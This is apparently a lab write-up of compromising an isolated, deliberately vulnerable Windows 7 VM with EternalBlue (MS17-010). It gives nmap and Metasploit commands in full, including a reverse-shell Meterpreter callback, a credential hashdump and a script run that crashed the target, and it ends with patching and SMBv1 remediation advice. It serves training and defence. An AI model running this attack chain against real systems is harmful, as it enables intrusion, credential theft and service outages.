Overview

  • Target: Blue
  • OS: Windows 7 SP1, x64
  • Service: SMB on TCP/445
  • Attack: MS17-010 (EternalBlue) to a Meterpreter session as SYSTEM
  • Scope: Intentionally vulnerable, isolated training VM

I checked Blue’s SMB service for MS17-010 and used EternalBlue to open a Meterpreter session as NT AUTHORITY\SYSTEM.

Reconnaissance

Blue is the target VM; Kali is the attacker. Placeholders such as <TARGET_IP> stand in for lab addresses. I found SMB on TCP/445 and checked it for MS17-010, Microsoft’s update covering SMBv1 vulnerabilities:

sudo nmap -p- -sC -sV -O -T4 <TARGET_IP> -oN blue_nmap.txt
nmap -Pn -p445 --script smb-vuln-ms17-010 <TARGET_IP>

# Metasploit scanner
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <TARGET_IP>
run

Microsoft’s MS17-010 bulletin describes SMBv1 vulnerabilities that allow remote code execution through specially crafted messages. This is a network-service path, not a guessed login.

Initial access

I loaded the EternalBlue module. It defaulted to an x64 Meterpreter payload (Metasploit’s interactive post-exploitation session), which matched the x64 target, so I set the target and callback:

use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
set RHOSTS <TARGET_IP>
set LHOST <CALLBACK_IP>
set LPORT 4444
show options
exploit

The exploit completed its overwrite and opened a Meterpreter session. getuid and sysinfo identified it:

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
OS: Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture: x64
Meterpreter: x64/windows

Privilege escalation

None needed: EternalBlue landed directly as NT AUTHORITY\SYSTEM.

Result

Result: SYSTEM access achieved

I obtained NT AUTHORITY\SYSTEM, Windows’ built-in LocalSystem identity, on the isolated Windows 7 SP1 x64 VM in one step with EternalBlue. From a second session I ran hashdump, which dumped the local password hashes for Administrator, Guest, HomeGroupUser$ and user.

I also tried the standalone AutoBlue-MS17-010 script against Blue:

python3 eternalblue_exploit7.py <TARGET_IP> shellcode/sc_all.bin
Target OS: Windows 7 Ultimate 7601 Service Pack 1
good response status: INVALID_PARAMETER

After repeated runs the VM crashed and rebooted to “Starting Windows”.

Attack path

  1. SMB discovery
  2. MS17-010 checks
  3. x64 EternalBlue
  4. Meterpreter
  5. NT AUTHORITY\SYSTEM

Remediation

Finding

Vulnerable SMB service

The EternalBlue session reached SYSTEM on the isolated Windows 7 VM.

Fix

Apply the MS17-010 security updates and move unsupported Windows systems to supported releases.

Finding

Legacy protocol exposure

The attack reached the target through its exposed SMB service.

Fix

Disable SMBv1 where it isn’t needed and restrict SMB to required clients and network segments. Reachability limits reduce exposure but do not replace patching.

Key takeaways

  • One unpatched SMBv1 service gave SYSTEM with no login and no escalation step.
  • Matching the payload architecture to the target (x64) matters for a clean session.
  • Repeated EternalBlue runs crashed the VM, so on a real engagement I would agree on that risk first.
